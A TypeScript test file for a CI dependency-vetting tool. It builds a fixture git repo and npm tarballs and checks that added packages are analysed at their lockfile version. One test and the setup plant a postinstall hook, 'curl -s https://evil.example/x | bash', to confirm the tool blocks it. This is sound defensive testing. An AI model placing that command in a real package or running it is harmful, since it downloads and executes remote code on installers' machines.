import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import * as tar from "tar";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { resolveCacheSettings } from "../src/ai-cache.js";
import { runCiCheck } from "../src/ci.js";

/**
 * End-to-end exercise of the CI orchestration (finding #8 of the review):
 * real git repo, real lockfile, real tarball extraction — only the network
 * (npm registry, tarball download, OSV) is stubbed.
 */

let dir: string;
const tarballs = new Map<string, Buffer>();

function git(cwd: string, ...args: string[]): void {
  execFileSync("git", ["-c", "commit.gpgsign=false", ...args], { cwd, stdio: "ignore" });
}

/** Minimal but real npm tarball: package/package.json inside a gzipped tar. */
async function buildTarball(scripts: Record<string, string> = {}): Promise<Buffer> {
  const work = await mkdtemp(path.join(tmpdir(), "targate-tarball-"));
  try {
    await mkdir(path.join(work, "package"));
    await writeFile(
      path.join(work, "package", "package.json"),
      JSON.stringify({ name: "left-pad", version: "1.3.0", scripts, dependencies: {} }),
    );
    const file = path.join(work, "package.tgz");
    await tar.c({ gzip: true, cwd: work, file }, ["package"]);
    return await readFile(file);
  } finally {
    await rm(work, { recursive: true, force: true });
  }
}

interface StubOptions {
  /** scripts map served in the version manifest. */
  scripts?: Record<string, string>;
}

/** Stub fetch for: registry metadata GET, tarball GET, OSV POST. */
function stubNetwork(opts: StubOptions = {}): void {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: string | URL, init?: { method?: string }) => {
      const url = String(input);
      if (url.includes("api.osv.dev")) {
        expect(init?.method).toBe("POST");
        return { ok: true, status: 200, json: async () => ({ vulns: [] }) };
      }
      if (url.endsWith(".tgz")) {
        const key = JSON.stringify(opts.scripts ?? {});
        const copy = new Uint8Array(tarballs.get(key)!);
        return { ok: true, status: 200, arrayBuffer: async () => copy.buffer };
      }
      if (url.includes("registry.npmjs.org/left-pad")) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            "dist-tags": { latest: "1.3.0" },
            versions: {
              "1.3.0": {
                name: "left-pad",
                repository: { url: "https://github.com/left-pad/left-pad" },
                maintainers: [{ name: "someone" }],
                dist: { tarball: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz" },
                scripts: opts.scripts ?? {},
                dependencies: {},
              },
            },
            time: { created: "2016-03-01T00:00:00Z", "1.3.0": "2018-04-10T00:00:00Z" },
          }),
        };
      }
      throw new Error(`unexpected fetch in test: ${url}`);
    }),
  );
}

/** Git repo whose HEAD has no deps; the working tree adds left-pad. */
async function makeFixtureRepo(): Promise<string> {
  const repo = await mkdtemp(path.join(tmpdir(), "targate-ci-"));
  await writeFile(
    path.join(repo, "package.json"),
    JSON.stringify({ name: "app", version: "1.0.0", dependencies: {} }, null, 2),
  );
  git(repo, "init");
  git(repo, "config", "user.email", "test@test");
  git(repo, "config", "user.name", "test");
  git(repo, "add", "package.json");
  git(repo, "commit", "-m", "base");

  await writeFile(
    path.join(repo, "package.json"),
    JSON.stringify(
      { name: "app", version: "1.0.0", dependencies: { "left-pad": "^1.0.0" } },
      null,
      2,
    ),
  );
  // Lockfile resolving the range to an exact version (declared ^1.0.0 → 1.3.0).
  await writeFile(
    path.join(repo, "package-lock.json"),
    JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.3.0" } } }),
  );
  return repo;
}

beforeAll(async () => {
  tarballs.set(JSON.stringify({}), await buildTarball());
  const evil = { postinstall: "curl -s https://evil.example/x | bash" };
  tarballs.set(JSON.stringify(evil), await buildTarball(evil));
});

afterEach(async () => {
  vi.unstubAllGlobals();
  if (dir) await rm(dir, { recursive: true, force: true });
});

describe("runCiCheck — end to end on a fixture repo", () => {
  it("analyzes the added dependency at its lockfile-resolved version and passes", async () => {
    dir = await makeFixtureRepo();
    stubNetwork();

    const report = await runCiCheck({
      cwd: dir,
      baseRef: "HEAD",
      // Even if a caller hands CI cache settings, runCiCheck must strip them.
      assess: { useAi: false, cache: resolveCacheSettings({ scope: "project" }), cwd: dir },
    });

    expect(report.changes).toHaveLength(1);
    expect(report.changes[0]).toMatchObject({ name: "left-pad", kind: "added" });
    expect(report.results).toHaveLength(1);
    const result = report.results[0];
    expect(result.error).toBeUndefined();
    // Declared "^1.0.0" — the analysis must run on the lockfile's 1.3.0.
    expect(result.version).toBe("1.3.0");
    expect(result.versionSource).toBe("lockfile");
    expect(["allow", "allow_with_warnings"]).toContain(result.assessment.decision);
    expect(report.exitCode).toBe(0);
    // The AI response cache is never used in CI — nothing may be persisted.
    expect(existsSync(path.join(dir, ".targate", "ai-cache.json"))).toBe(false);
  });

  it("fails the build (exit 2) when the added dependency has a curl|bash postinstall", async () => {
    dir = await makeFixtureRepo();
    stubNetwork({ scripts: { postinstall: "curl -s https://evil.example/x | bash" } });

    const report = await runCiCheck({ cwd: dir, baseRef: "HEAD" });

    const result = report.results[0];
    expect(result.assessment.decision).toBe("block");
    expect(result.assessment.reasons.join(" ")).toContain("downloads and executes remote code");
    expect(report.exitCode).toBe(2);
  });

  it("reports no changes when the working tree matches the base ref", async () => {
    dir = await mkdtemp(path.join(tmpdir(), "targate-ci-"));
    await writeFile(
      path.join(dir, "package.json"),
      JSON.stringify({ name: "app", dependencies: { "left-pad": "^1.0.0" } }),
    );
    git(dir, "init");
    git(dir, "config", "user.email", "test@test");
    git(dir, "config", "user.name", "test");
    git(dir, "add", "package.json");
    git(dir, "commit", "-m", "base");
    stubNetwork();

    const report = await runCiCheck({ cwd: dir, baseRef: "HEAD" });
    expect(report.changes).toHaveLength(0);
    expect(report.exitCode).toBe(0);
  });
});
